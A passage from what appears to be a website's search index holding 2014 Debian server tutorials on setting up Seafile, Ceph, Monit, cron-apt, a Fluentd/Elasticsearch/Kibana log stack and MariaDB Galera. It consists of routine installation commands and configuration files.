                content: " Software version Seafile 3.0 Operating System Debian 7 Website Seafile Website Last Update 22/06/2014 Introduction linkSeafile1 is a next-generation open source cloud storage system, with advanced support for file syncing, privacy protection and teamwork.\nCollections of files are called libraries, and each library can be synced separately. A library can be encrypted with a user chosen password. This password is not stored on the server, so even the server admin can’t view your file contents.\nSeafile lets you create groups with file syncing, wiki, and discussion enabling easy collaboration around documents within a team.\nFor this documentation, you need to have:\nA web server (here Nginx) A MariaDB / MySQL server Python installed Installation linkThe installation of Seafile is not complicated but a little bit long. First of all, you need o grab the latest seafile version:\nmkdir -p /usr/share/nginx/www/seafile cd /usr/share/nginx/www/seafile wget https://bitbucket.org/haiwen/seafile/downloads/seafile-server_3.0.0_x86-64.tar.gz tar -xzf seafile-server_3.0.0_x86-64.tar.gz chown -Rf www-data. seafile-server-3.0.0 Then we need to install dependencies:\naptitude install python-simplejson python-setuptools python-mysqldb python-imaging Configuration linkMariaDB linkThe first thing to do is to configure MariaDB accounts and create databases (adapt those lines with your needs):\nCREATE DATABASE `seafile\\_ccnet`; CREATE DATABASE `seafile\\_db`; CREATE DATABASE `seafile\\_hub`; CREATE USER 'seafile_user'@'127.0.0.1' identified by 'password'; GRANT ALL PRIVILEGES ON `seafile\\_ccnet` . * TO 'seafile_user'@'127.0.0.1'; GRANT ALL PRIVILEGES ON `seafile\\_db` . * TO 'seafile_user'@'127.0.0.1'; GRANT ALL PRIVILEGES ON `seafile\\_hub` . * TO 'seafile_user'@'127.0.0.1'; FLUSH PRIVILEGES; Then you have to launch the installer:\n\u003e ./setup-seafile-mysql.sh [...] ------------------------------------------------------- Please choose a way to initialize seafile databases: ------------------------------------------------------- [1] Create new ccnet/seafile/seahub databases [2] Use existing ccnet/seafile/seahub databases Choose to use existing databases and credentials when it is asked to you. The 1 choice can be used but as I encountered issues, that’s why I did it manually.\nCcnet linkRegarding the ccnet configuration, there is nothing to do especially instead of if you want SSL instead. If you want https, modify the SERVICE_URL like this (ccnet/ccnet.conf):\n[General] SERVICE_URL = https://seafile.deimos.fr ... Seahub linkFor SSL as well, update this file by adding on top of the file this kind of line (seahub_settings.py):\nHTTP_SERVER_ROOT = 'https://seafile.deimos.fr/seafhttp' Webdav linkTo implement webdav for clients that can’t use Seafile client, add this configuration (/usr/share/nginx/www/seafile/conf/seafdav.conf):\n[WEBDAV] enabled = true port = 8080 fastcgi = true share_name = /seafdav Nginx linkNow to finish, here is an example of Nginx configuration for SSL purpose:\nserver { include listen_port.conf; server_name seafile.deimos.fr; # Force redirect http to https rewrite ^ https://$http_host$request_uri? permanent; } server { include ssl/deimos.fr_ssl.conf; include pagespeed.conf; server_name seafile.deimos.fr; root /usr/share/nginx/www/deimos.fr/seafile; access_log /var/log/nginx/seafile.deimos.fr_access.log; error_log /var/log/nginx/seafile.deimos.fr_error.log; # Max upload size client_max_body_size 1G; location / { fastcgi_pass 127.0.0.1:8090; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_script_name; fastcgi_param SERVER_PROTOCOL $server_protocol; fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type; fastcgi_param CONTENT_LENGTH $content_length; fastcgi_param SERVER_ADDR $server_addr; fastcgi_param SERVER_PORT $server_port; fastcgi_param SERVER_NAME $server_name; fastcgi_param REMOTE_ADDR $remote_addr; fastcgi_param HTTPS on; fastcgi_param HTTP_SCHEME https; } # Webdav location /seafdav { fastcgi_pass 127.0.0.1:8080; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_script_name; fastcgi_param SERVER_PROTOCOL $server_protocol; fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type; fastcgi_param CONTENT_LENGTH $content_length; fastcgi_param SERVER_ADDR $server_addr; fastcgi_param SERVER_PORT $server_port; fastcgi_param SERVER_NAME $server_name; fastcgi_param HTTPS on; } location /seafhttp { rewrite ^/seafhttp(.*)$ $1 break; proxy_pass http://127.0.0.1:8082; client_max_body_size 0; } location /media { root /var/www/deimos.fr/seafile/seafile-server-latest/seahub; } } Init script linkRegarding the init script, add it and adapt the highlighted lines (/etc/init.d/seafile-server):\n#!/bin/sh ### BEGIN INIT INFO # Provides: seafile-server # Required-Start: $local_fs $remote_fs $network # Required-Stop: $local_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Starts Seafile Server # Description: starts Seafile Server ### END INIT INFO # Change the value of \"user\" to your linux user name user=www-data # Change the value of \"script_path\" to your path of seafile installation seafile_dir=/usr/share/nginx/www/deimos.fr/seafile script_path=${seafile_dir}/seafile-server-latest seafile_init_log=${seafile_dir}/logs/seafile.init.log seahub_init_log=${seafile_dir}/logs/seahub.init.log # Change the value of fastcgi to true if fastcgi is to be used fastcgi=true # Set the port of fastcgi, default is 8000. Change it if you need different. fastcgi_port=8090 case \"$1\" in start) sudo -u ${user} ${script_path}/seafile.sh start \u003e\u003e ${seafile_init_log} if [ $fastcgi = true ]; then sudo -u ${user} ${script_path}/seahub.sh start-fastcgi ${fastcgi_port} \u003e\u003e ${seahub_init_log} else sudo -u ${user} ${script_path}/seahub.sh start \u003e\u003e ${seahub_init_log} fi ;; restart) sudo -u ${user} ${script_path}/seafile.sh restart \u003e\u003e ${seafile_init_log} if [ $fastcgi = true ]; then sudo -u ${user} ${script_path}/seahub.sh restart-fastcgi ${fastcgi_port} \u003e\u003e ${seahub_init_log} else sudo -u ${user} ${script_path}/seahub.sh restart \u003e\u003e ${seahub_init_log} fi ;; stop) sudo -u ${user} ${script_path}/seafile.sh $1 \u003e\u003e ${seafile_init_log} sudo -u ${user} ${script_path}/seahub.sh $1 \u003e\u003e ${seahub_init_log} ;; *) echo \"Usage: /etc/init.d/seafile {start|stop|restart}\" exit 1 ;; esac I’ve changed the default port as mine was already used.\nThen activate it on boot:\nchmod 755 /etc/init.d/seafile-server update-rc.d seafile-server defaults You can now reload your Nginx configuration and start Seafile:\nservice nginx reload service seafile-server start You should have access to Seafile now :-)\nReferences link https://seafile.com ↩︎\n"
            }
        );
    index.add(
            {
                id:  179 ,
                href: "\/Ceph_:_performance,_reliability_and_scalability_storage_solution\/",
                title: "Ceph: Performance, Reliability and Scalability Storage Solution",
                description: "Learn how to implement Ceph, an open-source distributed storage system that provides object, block, and file storage in a single platform for improved reliability and scalability.",
                content: " Software version 0.72.2 Operating System Debian 7 Website Ceph Website Last Update 02/06/2014 Introduction linkCeph is an open-source, massively scalable, software-defined storage system which provides object, block and file system storage in a single platform. It runs on commodity hardware-saving you costs, giving you flexibility and because it’s in the Linux kernel, it’s easy to consume.\nCeph is able to manage:\nObject Storage: Ceph provides seamless access to objects using native language bindings or radosgw, a REST interface that’s compatible with applications written for S3 and Swift. Block Storage: Ceph’s RADOS Block Device (RBD) provides access to block device images that are striped and replicated across the entire storage cluster. File System: Ceph provides a POSIX-compliant network file system that aims for high performance, large data storage, and maximum compatibility with legacy applications (not yet stable) Whether you want to provide Ceph Object Storage and/or Ceph Block Device services to Cloud Platforms, deploy a Ceph Filesystem or use Ceph for another purpose, all Ceph Storage Cluster deployments begin with setting up each Ceph Node, your network and the Ceph Storage Cluster. A Ceph Storage Cluster requires at least one Ceph Monitor and at least two Ceph OSD Daemons. The Ceph Metadata Server is essential when running Ceph Filesystem clients.\nOSDs: A Ceph OSD Daemon (OSD) stores data, handles data replication, recovery, backfilling, rebalancing, and provides some monitoring information to Ceph Monitors by checking other Ceph OSD Daemons for a heartbeat. A Ceph Storage Cluster requires at least two Ceph OSD Daemons to achieve an active + clean state when the cluster makes two copies of your data (Ceph makes 2 copies by default, but you can adjust it). Monitors: A Ceph Monitor maintains maps of the cluster state, including the monitor map, the OSD map, the Placement Group (PG) map, and the CRUSH map. Ceph maintains a history (called an “epoch”) of each state change in the Ceph Monitors, Ceph OSD Daemons, and PGs. MDSs: A Ceph Metadata Server (MDS) stores metadata on behalf of the Ceph Filesystem (i.e., Ceph Block Devices and Ceph Object Storage do not use MDS). Ceph Metadata Servers make it feasible for POSIX file system users to execute basic commands like ls, find, etc. without placing an enormous burden on the Ceph Storage Cluster. Ceph stores a client’s data as objects within storage pools. Using the CRUSH algorithm, Ceph calculates which placement group should contain the object, and further calculates which Ceph OSD Daemon should store the placement group. The CRUSH algorithm enables the Ceph Storage Cluster to scale, rebalance, and recover dynamically.\nTesting case linkIf you want to test with Vagrant and VirtualBox, I’ve made a Vagrantfile for it running on Debian Wheezy:\n# -*- mode: ruby -*- # vi: set ft=ruby : ENV['LANG'] = 'C' # Vagrantfile API/syntax version. Don't touch unless you know what you're doing! VAGRANTFILE_API_VERSION = \"2\" # Insert all your Vms with configs boxes = [ { :name =\u003e :mon1, :role =\u003e 'mon'}, { :name =\u003e :mon2, :role =\u003e 'mon'}, { :name =\u003e :mon3, :role =\u003e 'mon'}, { :name =\u003e :osd1, :role =\u003e 'osd', :ip =\u003e '192.168.33.31'}, { :name =\u003e :osd2, :role =\u003e 'osd', :ip =\u003e '192.168.33.32'}, { :name =\u003e :osd3, :role =\u003e 'osd', :ip =\u003e '192.168.33.33'}, ] $install = \u003c"
            }
        );
    index.add(
            {
                id:  180 ,
                href: "\/monit-easily-use-triggers-on-your-system\/",
                title: "Monit: Easily Use Triggers on Your System",
                description: "Learn how to install, configure, and use Monit for managing and monitoring processes, programs, files, directories, and filesystems on Unix systems with automatic maintenance and error handling.",
                content: " Software version 5.4-2 Operating System Debian 7 Website Monit Website Last Update 28/05/2014 Introduction linkMonit is a utility for managing and monitoring processes, programs, files, directories and filesystems on a Unix system. Monit conducts automatic maintenance and repair and can execute meaningful causal actions in error situations. E.g. Monit can start a process if it does not run, restart a process if it does not respond and stop a process if it uses too much resources. You can use Monit to monitor files, directories and filesystems for changes, such as timestamps changes, checksum changes or size changes.\nMonit is controlled via an easy to configure control file based on a free-format, token-oriented syntax. Monit logs to syslog or to its own log file and notifies you about error conditions via customizable alert messages. Monit can perform various TCP/IP network checks, protocol checks and can utilize SSL for such checks. Monit provides a http(s) interface and you may use a browser to access the Monit program.\nInstallation linkTo install Monit, this is simple:\naptitude install monit Configuration linkRegarding the configuration file, you’ve got a global configuration file where you can adjust some parameters:\n(/etc/monit/monitrc)\nset daemon 120 # check services at 2-minute intervals set logfile /var/log/monit.log set idfile /var/lib/monit/id set statefile /var/lib/monit/state set mailserver localhost set eventqueue basedir /var/lib/monit/events # set the base directory where events will be stored slots 100 # optionally limit the queue size set alert my@email.com set httpd port 2812 and allow localhost # allow localhost to connect to the server and include /etc/monit/conf.d/* But here is a configuration file to restart multiple services in a shell script when an URL is not containing a specific content:\n(/etc/monit/conf.d/web)\ncheck host blog.deimos.fr with address blog.deimos.fr if failed (url http://blog.deimos.fr and content == 'Because human memory can not contain Gb') with timeout 20 seconds for 3 cycles then exec \"/etc/scripts/web_services.sh restart\" alert my@email.com There are several type of usages with Monit and you can see examples here.\nWeb interface linkRegarding the web interface, you can use Nginx and do a proxy pass to access from outside with credentials:\n(/etc/nginx/sites-enabled/default)\n# Monit status location /monit/ { rewrite ^/monit/(.*) /$1 break; proxy_ignore_client_abort on; proxy_pass http://127.0.0.1:2812; # User access auth_basic \"Please logon\"; auth_basic_user_file /etc/nginx/access/htaccess; } And create the htaccess file with credentials.\nReferences link https://mmonit.com/monit/documentation/monit.html https://mmonit.com/monit/documentation/monit.html#configuration_examples "
            }
        );
    index.add(
            {
                id:  181 ,
                href: "\/Cron-apt_:_Installation_des_mises_%C3%A0_jour_de_s%C3%A9curit%C3%A9_automatique\/",
                title: "Cron-apt: Automatic Security Updates Installation",
                description: "How to setup automatic security updates on Debian using cron-apt",
                content: "Introduction linkMy goal is to install security updates automatically. Obviously this kind of approach is not really recommended, but on a Debian stable system where only security updates are installed, we minimize the risks.\nSo I started looking for a tool to do this kind of thing and found cron-apt.\nInstallation linkSimply:\naptitude install cron-apt Configuration linkNow that it’s installed, let’s create a file that will contain only the Debian security repositories:\ngrep security /etc/apt/sources.list \u003e /etc/apt/security.sources.list Then let’s edit the cron-apt configuration file to use aptitude, send update status emails, and specify that we only want security updates:\nAPTCOMMAND=/usr/bin/aptitude OPTIONS=\"-o quiet=1 -o Dir::Etc::SourceList=/etc/apt/security.sources.list\" MAILTO=\"xxx@mycompany.com\" MAILON=\"always\" Then we just need to modify the default actions to perform. By default, it only downloads packages without installing them (because of the -d option on the dist-upgrade line). That’s why we are going to modify this file accordingly:\nautoclean -y dist-upgrade -y -o APT::Get::Show-Upgraded=true Finally, if you want to change the update time, check this file and adapt it according to your needs:\n# # Regular cron jobs for the cron-apt package # # Every night at 4 o'clock. 0 4\t* * *\troot\ttest -x /usr/sbin/cron-apt \u0026\u0026 /usr/sbin/cron-apt # Every hour. # 0 *\t* * *\troot\ttest -x /usr/sbin/cron-apt \u0026\u0026 /usr/sbin/cron-apt /etc/cron-apt/config2 # Every five minutes. # */5 *\t* * *\troot\ttest -x /usr/sbin/cron-apt \u0026\u0026 /usr/sbin/cron-apt /etc/cron-apt/config2 "
            }
        );
    index.add(
            {
                id:  182 ,
                href: "\/Fluentd:_quickly_search_in_your_logs_with_Elasticsearch,_Kibana_and_Fluentd\/",
                title: "Fluentd: Quickly Search in Your Logs with Elasticsearch, Kibana and Fluentd",
                description: "How to set up a log management and search solution using Fluentd, Elasticsearch, and Kibana for efficient log collection, processing, and visualization",
                content: " Software version 1.1.19-1 Operating System Debian 7 Website Fluentd Website Last Update 10/05/2014 Others Elasticsearch 1.1\nKibana 3.0.1 Introduction linkManaging logs is not a complicated task with classical syslog systems (syslog-ng, rsyslog…). However, being able to search in them quickly when you have several gigabits of logs, with scalability, with a nice graphical interface etc…is not the same thing.\nFortunately today, tools that permit us to do it very well exist. Here are the list of tools that we’re going to use to achieve it:\nElasticsearch1: Elasticsearch is a flexible and powerful open source, distributed, real-time search and analytics engine. Architected from the ground up for use in distributed environments where reliability and scalability are must-haves, Elasticsearch gives you the ability to move easily beyond simple full-text search. Through its robust set of APIs and query DSLs, plus clients for the most popular programming languages, Elasticsearch delivers on the near limitless promises of search technology Kibana2: Kibana is Elasticsearch’s data visualization engine, allowing you to natively interact with all your data in Elasticsearch via custom dashboards. Kibana’s dynamic dashboard panels are savable, shareable and exportable, displaying changes to queries into Elasticsearch in real-time. You can perform data analysis in Kibana’s beautiful user interface using pre-designed dashboards or update these dashboards in real-time for on-the-fly data analysis. Fluentd3: Fluentd is an open source data collector designed for processing data streams. All those elements will be installed on the same machine to make it simpler at start. Fluentd is an alternative to Logstash. They both are data collectors, however Fluentd permits sending logs to other destinations:\nHere is what kind of infrastructure you can setup (no redundancy here, just a single instance):\nTo avoid dependencies issues and make things simpler, we’re going to use fluentd as forwarder here to transfer syslog and other kinds of logs to another fluentd instance. On the last one, Elasticsearch and Kibana will be installed.\nInstallation linkElasticsearch linkThe first thing to put in place is the backend that will store our logs. As we want the latest version, we’re going to use the dedicated repository:\ncd /tmp wget -O - http://packages.elasticsearch.org/GPG-KEY-elasticsearch | apt-key add - echo \"deb http://packages.elasticsearch.org/elasticsearch/1.1/debian stable main\" \u003e /etc/apt/sources.list.d/elasticsearch.list Then we’re ready to install:\naptitude update aptitude install elasticsearch openjdk-7-jre-headless openntpd To finish, configure the auto start of the service and run it:\nupdate-rc.d elasticsearch defaults 95 10 /etc/init.d/elasticsearch start Kibana linkRegarding Kibana, there is unfortunately no repository at the moment. So we’re going to use the git repository to make it simpler. First of all, install a web server like Nginx:\naptitude install nginx git Now clone the repository and use the latest version (here 3.0.1):\ncd /usr/share/nginx/www git clone https://github.com/elasticsearch/kibana.git cd kibana git checkout v3.0.1 You can get the list of all versions with git tag command.\nYou now need to configure Nginx to get it provided properly:\nserver { listen 80; server_name kibana.deimos.fr; root /usr/share/nginx/www/kibana/src/; index index.html; access_log /var/log/nginx/kibana.deimos.fr_access.log; error_log /var/log/nginx/kibana.deimos.fr_error.log; location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ /index.html; # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules } } To finish for Kibana, edit the configuration file and adapt the elasticsearch line to your need:\n* ==== elasticsearch * * The URL to your elasticsearch server. You almost certainly don't * want +http://localhost:9200+ here. Even if Kibana and Elasticsearch are on * the same host. By default this will attempt to reach ES at the same host you have * kibana installed on. You probably want to set it to the FQDN of your * elasticsearch host * * Note: this can also be an object if you want to pass options to the http client. For example: * * +elasticsearch: {server: \"http://localhost:9200\", withCredentials: true}+ * */ elasticsearch: \"http://:9200\", Restart Nginx service to make the web interface available to http://:\nFluentd linkFluentd is now the last part that will permit sending syslog to another Fluentd or Elasticsearch. So this has to be done on all Fluentd forwarders or servers.\nFirst of all, we’ll adjust system parameters to be sure we won’t face performance issues due to it. First, edit the security limits and add these lines:\nroot soft nofile 65536 root hard nofile 65536 * soft nofile 65536 * hard nofile 65536 Then we’re going to add the sysctl tuning in that file:\nnet.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_tw_reuse = 1 net.ipv4.ip_local_port_range = 10240 65535 And apply the new configuration:\nsysctl -p We’re going to add the official repository:\nwget http://packages.treasure-data.com/debian/RPM-GPG-KEY-td-agent apt-key add RPM-GPG-KEY-td-agent echo 'deb http://packages.treasure-data.com/debian/ lucid contrib' \u003e /etc/apt/sources.list.d/fluentd.list However, during the time I’m writing this documentation, there are no Wheezy version available (squeeze only) and there is a missing dependency on the libssl. We’re going to get it from squeeze and install it:\nwget http://ftp.fr.debian.org/debian/pool/main/o/openssl/libssl0.9.8_0.9.8o-4squeeze14_amd64.deb dpkg -i libssl0.9.8_0.9.8o-4squeeze14_amd64.deb We’re now ready to install Fluentd agent:\naptitude update aptitude install td-agent openntpd mkdir /etc/td-agent/config.d Modify then the configuration to set the global configuration:\n## match tag=debug.** and dump to console type stdout # HTTP input # POST http://localhost:8888/?json= # POST http://localhost:8888/td.myapp.login?json={\"user\"%3A\"me\"} # @see http://docs.fluentd.org/articles/in_http type http port 8888 ## live debugging agent type debug_agent bind 127.0.0.1 port 24230 # glob match pattern include config.d/*.conf Restart td-agent service.\nElasticsearch plugin linkBy default, it doesn’t know how to forward to Elasticsearch. So we will need to install a dedicated plugin for it on the server, not on the forwarders. Here is how to install it:\n\u003e aptitude install build-essential ruby-dev libcurl4-openssl-dev make \u003e /usr/lib/fluent/ruby/bin/fluent-gem install fluent-plugin-elasticsearch Building native extensions. This could take a while... Fetching: multi_json-1.10.0.gem (100%) Fetching: multipart-post-2.0.0.gem (100%) Fetching: faraday-0.9.0.gem (100%) Fetching: elasticsearch-transport-0.4.11.gem (100%) Fetching: elasticsearch-api-0.4.11.gem (100%) Fetching: elasticsearch-0.4.11.gem (100%) Fetching: fluent-plugin-elasticsearch-0.3.0.gem (100%) Successfully installed patron-0.4.18 Successfully installed multi_json-1.10.0 Successfully installed multipart-post-2.0.0 Successfully installed faraday-0.9.0 Successfully installed elasticsearch-transport-0.4.11 Successfully installed elasticsearch-api-0.4.11 Successfully installed elasticsearch-0.4.11 Successfully installed fluent-plugin-elasticsearch-0.3.0 8 gems installed Installing ri documentation for patron-0.4.18... Installing ri documentation for multi_json-1.10.0... Installing ri documentation for multipart-post-2.0.0... Installing ri documentation for faraday-0.9.0... Installing ri documentation for elasticsearch-transport-0.4.11... Installing ri documentation for elasticsearch-api-0.4.11... Installing ri documentation for elasticsearch-0.4.11... Installing ri documentation for fluent-plugin-elasticsearch-0.3.0... Installing RDoc documentation for patron-0.4.18... Installing RDoc documentation for multi_json-1.10.0... Installing RDoc documentation for multipart-post-2.0.0... Installing RDoc documentation for faraday-0.9.0... Installing RDoc documentation for elasticsearch-transport-0.4.11... Installing RDoc documentation for elasticsearch-api-0.4.11... Installing RDoc documentation for elasticsearch-0.4.11... Installing RDoc documentation for fluent-plugin-elasticsearch-0.3.0... Configuration linkHere you will see how to configure multiple options of Fluentd. Choose the ones you want to add to your Fluentd instances (can have several). Here is a good example of what is needed in this kind of configuration:\nForwarders linkTo make a Fluentd forwards data to a receiver, simply create that configuration file and set the Fluentd node to forward to:\ntype forward host fluentd.deimos.fr port 24224 Receiver linkIf you want your node to be able to receive data from other Fluentd forwarders, you need to add this configuration:\n## built-in TCP input ## @see http://docs.fluentd.org/articles/in_forward type forward In that use case, you need to add this on the server role of Fluentd.\nRsyslog linkBy default, Debian is using Rsyslog and we’re going to see here how to forward syslog to Fluentd. First of all, on the Fluentd forwarders, create a syslog file containing the configuration as follows:\ntype syslog port 5140 bind 127.0.0.1 tag syslog And restart td-agent service. It will create a listening port for Syslog.\nThen simply add this line to redirect (in addition to the local files) syslog to Fluentd:\n*.* @127.0.0.1:5140 Restart Rsyslog service.\nLog files linkYou may want to be able to log files as well. Here is a way to do it for a single access file from Nginx logs:\ntype tail # Select the file to watch path /var/log/nginx/access.log # Select a file to store offset position pos_file /tmp/td-agent.nginx.pos # Format type format syslog # Tag with a distinguish name tag system.nginx Then restart the td-agent service.\nNginx linkThe problem of the basic example above is each element is passed on a single line. That means we can’t filter accurately. To do it, you will need to split with regex each field and give them a field name. You also need to specify the time and date format. Here is how to do it for Nginx:\ntype tail path /var/log/nginx/access.log pos_file /tmp/td-agent.nginx.pos format syslog tag nginx.access # Regex fields format /^(?[^ ]*) (?[^ ]*) (?[^ ]*) \\[(?[^\\]]*)\\] \"(?\\S+)(?: +(?[^\\\"]*) +\\S*)?\" (?[^ ]*) (?[^ ]*) \"(?[^\\\"]*)\" \"(?[^\\\"]*)\"$/ # Date and time format time_format %d/%b/%Y:%H:%M:%S %z It may be complicated to create a working regex the first time. That’s why a website called Fluentular (http://fluentular.herokuapp.com) can help you to create the format line.\nFluentd Elasticsearch linkTo send all incoming sources to Elasticsearch, simply create that configuration file:\ntype elasticsearch logstash_format true host localhost port 9200 Then restart the td-agent service.\nUsage linkIf you look at the web interface, you should have something like this:\nYou can now try to add other widgets, look at the official documentation4.\nReferences link http://jasonwilder.com/blog/2013/11/19/fluentd-vs-logstash/ http://repeatedly.github.io/2014/02/analyze-event-logs-using-fluentd-and-elasticsearch/ http://www.devconsole.info/?p=917 http://lifeandshell.com/install-elasticsearch-kibana-fluentd-opensource-splunk-with-syslog-clients/ https://github.com/fluent/fluentd http://www.elasticsearch.org ↩︎\nhttp://www.elasticsearch.org/overview/kibana/ ↩︎\nhttp://fluentd.org/ ↩︎\nhttp://www.elasticsearch.org/guide/en/kibana/current/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  183 ,
                href: "\/MariaDB_Galera_Cluster_:_la_r%C3%A9plication_multi_maitres\/",
                title: "MariaDB Galera Cluster: Multi-Master Replication",
                description: "Learn how to set up and manage MariaDB Galera Cluster for multi-master replication in a database environment with synchronous replication across multiple nodes.",
                content: " Software version 5.5 Operating System Debian 7 Website MariaDB Website Last Update 19/04/2014 Others Galera 23.2.4(r147) Introduction linkIf you have already set up MySQL replication, you know that you’re limited to 2 master nodes maximum. Many actions must be done manually, making it difficult to have something that’s both scalable and accessible for simultaneous writes, since by default writes are synchronous.\nNote: If you need advice or support for MySQL/MariaDB/Galera, I recommend OceanDBA.\nThere’s a tool called Galera that integrates with MariaDB or MySQL (through recompilation in both cases) and allows multi-master replication (3 nodes minimum). There are several products that use Galera:\nMariaDB Galera Cluster Percona Cluster MySQL Galera Cluster For those wondering, this is really different from MySQL Cluster which knows how to scale writes. Here it’s only multi-threaded. And unlike MHA which is an asynchronous solution, Galera is synchronous.\nGalera only works with the InnoDB engine and allows:\nSynchronous replication Active multi-master replication Simultaneous read/write on multiple nodes Automatic detection when a node fails Automatic node reintegration No lag on slaves No lost transactions Lower client latency Although this seems perfect on paper, there are some limitations:\nOnly supports InnoDB All tables must have primary keys DELETE only works on tables with primary keys LOCK/UNLOCK/GET_LOCK/RELEASE_LOCK doesn’t work in multi-master Query logs can only be sent to files, not tables XA transactions are not supported To help you understand a typical architecture:\nThere’s also an online tool to help build this kind of infrastructure: Galera Configurator\nInstallation linkTo install MariaDB, it’s unfortunately not embedded in Debian, so we’ll add a repository. First of all, install a python tool to get aptkey:\naptitude install python-software-properties Then let’s add this repository (https://downloads.mariadb.org/mariadb/repositories/):\napt-key adv --recv-keys --keyserver keyserver.ubuntu.com 0xcbcb082a1bb943db add-apt-repository 'deb http://mirrors.linsrv.net/mariadb/repo/10.0/debian wheezy main' We’re now going to change apt pinning to prioritize MariaDB’s repository:\nPackage: * Pin: release o=MariaDB Pin-Priority: 1000 info At the time of writing, there is a small dependency issue with some packages. You’ll need to download them in advance and install them. You don’t need to follow the rest of this installation if you haven’t encountered errors with the previous steps. wget http://ftp.fr.debian.org/debian/pool/main/o/openssl/libssl0.9.8_0.9.8o-4squeeze14_amd64.deb dpkg -i libssl0.9.8_0.9.8o-4squeeze14_amd64.deb Now, we’ll install MariaDB and Galera:\naptitude update aptitude install mariadb-galera-server galera rsync openntpd info The rsync package is not mandatory, but necessary if you’re going to use this transfer method later. Configuration linkMariaDB linkBefore we start changing the configuration, we need to delete some log files or MariaDB won’t start. We’ll need to stop the MariaDB service:\nservice mysql stop Then we’ll apply this MariaDB configuration:\n# MariaDB database server configuration file. # Pierre Mavro / Deimosfr # # You can copy this file to one of: # - \"/etc/mysql/my.cnf\" to set global options, # - \"~/.my.cnf\" to set user-specific options. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use. # # For explanations see # http://dev.mysql.com/doc/mysql/en/server-system-variables.html # This will be passed to all mysql clients # It has been reported that passwords should be enclosed with ticks/quotes # escpecially if they contain \"#\" chars... # Remember to edit /etc/mysql/debian.cnf when changing the socket location. [client] port\t= 3306 socket\t= /var/run/mysqld/mysqld.sock # Here is entries for some specific programs # The following values assume you have at least 32M ram # This was formally known as [safe_mysqld]. Both versions are currently parsed. [mysqld_safe] socket\t= /var/run/mysqld/mysqld.sock nice\t= 0 [mysqld] # # * Basic Settings # user\t= mysql pid-file\t= /var/run/mysqld/mysqld.pid socket\t= /var/run/mysqld/mysqld.sock port\t= 3306 basedir\t= /usr datadir\t= /var/lib/mysql innodb_log_group_home_dir = /var/lib/mysql tmpdir\t= /tmp lc_messages_dir\t= /usr/share/mysql lc_messages\t= en_US skip-external-locking character_set_server = utf8 collation_server = utf8_general_ci # # Instead of skip-networking the default is now to listen only on # localhost which is more compatible and is not less secure. bind-address\t= 0.0.0.0 # # * Fine Tuning # max_connections\t= 500 connect_timeout\t= 5 wait_timeout\t= 600 max_allowed_packet\t= 16M thread_cache_size = 128 sort_buffer_size\t= 16M bulk_insert_buffer_size\t= 16M tmp_table_size\t= 32M max_heap_table_size\t= 64M net_buffer_length\t= 4k # # * MyISAM # # This replaces the startup script and checks MyISAM tables if needed # the first time they are touched. On error, make copy and try a repair. myisam_recover = BACKUP key_buffer_size\t= 128M #open-files-limit\t= 2000 table_open_cache\t= 400 myisam_sort_buffer_size\t= 512M concurrent_insert\t= 2 read_buffer_size\t= 2M read_rnd_buffer_size\t= 1M # # * Query Cache Configuration # # Cache only tiny result sets, so we can fit more in the query cache. query_cache_limit\t= 128K query_cache_size\t= 64M # for more write intensive setups, set to DEMAND or OFF #query_cache_type\t= DEMAND # # * Logging and Replication # # Both location gets rotated by the cronjob. # Be aware that this log type is a performance killer. # As of 5.1 you can enable the log at runtime! #general_log_file = /var/log/mysql/mysql.log #general_log = 1 # # Error logging goes to syslog due to /etc/mysql/conf.d/mysqld_safe_syslog.cnf. # # we do want to know about network errors and such log_warnings\t= 2 # # Enable the slow query log to see queries with especially long duration #slow_query_log[={0|1}] slow_query_log_file\t= /var/log/mysql/mariadb-slow.log long_query_time = 10 #log_slow_rate_limit\t= 1000 log_slow_verbosity\t= query_plan #log-queries-not-using-indexes #log_slow_admin_statements # # The following can be used as easy to replay backup logs or for replication. # note: if you are setting up a replication slave, see README.Debian about # other settings you may need to change. #server-id\t= 1 #report_host\t= master1 #auto_increment_increment = 2 #auto_increment_offset\t= 1 log_bin\t= /var/log/mysql/mariadb-bin log_bin_index\t= /var/log/mysql/mariadb-bin.index # not fab for performance, but safer #sync_binlog\t= 1 expire_logs_days\t= 10 max_binlog_size = 100M # slaves #relay_log\t= /var/log/mysql/relay-bin #relay_log_index\t= /var/log/mysql/relay-bin.index #relay_log_info_file\t= /var/log/mysql/relay-bin.info #log_slave_updates #read_only # # If applications support it, this stricter sql_mode prevents some # mistakes like inserting invalid dates etc. #sql_mode\t= NO_ENGINE_SUBSTITUTION,TRADITIONAL # # * InnoDB # # InnoDB is enabled by default with a 10MB datafile in /var/lib/mysql/. # Read the manual for more InnoDB related options. There are many! default_storage_engine\t= InnoDB # you can't just change log file size, requires special procedure #innodb_log_file_size\t= 50M innodb_buffer_pool_size\t= 256M innodb_log_buffer_size\t= 8M innodb_log_file_size\t= 256M thread_concurrency\t= 64 innodb_thread_concurrency\t= 64 innodb_read_io_threads\t= 16 innodb_write_io_threads\t= 16 innodb_flush_log_at_trx_commit = 2 innodb_file_per_table\t= 1 innodb_open_files\t= 400 innodb_io_capacity\t= 600 innodb_lock_wait_timeout = 60 innodb_flush_method\t= O_DIRECT innodb_doublewrite = 0 innodb_additional_mem_pool_size\t= 20M innodb_buffer_pool_restore_at_startup\t= 500 innodb_file_per_table # # * Security Features # # Read the manual, too, if you want chroot! # chroot = /var/lib/mysql/ # # For generating SSL certificates I recommend the OpenSSL GUI \"tinyca\". # # ssl-ca=/etc/mysql/cacert.pem # ssl-cert=/etc/mysql/server-cert.pem # ssl-key=/etc/mysql/server-key.pem [mysqldump] quick quote-names max_allowed_packet\t= 16M [mysql] #no-auto-rehash\t# faster start of mysql but no tab completition [isamchk] key_buffer\t= 16M 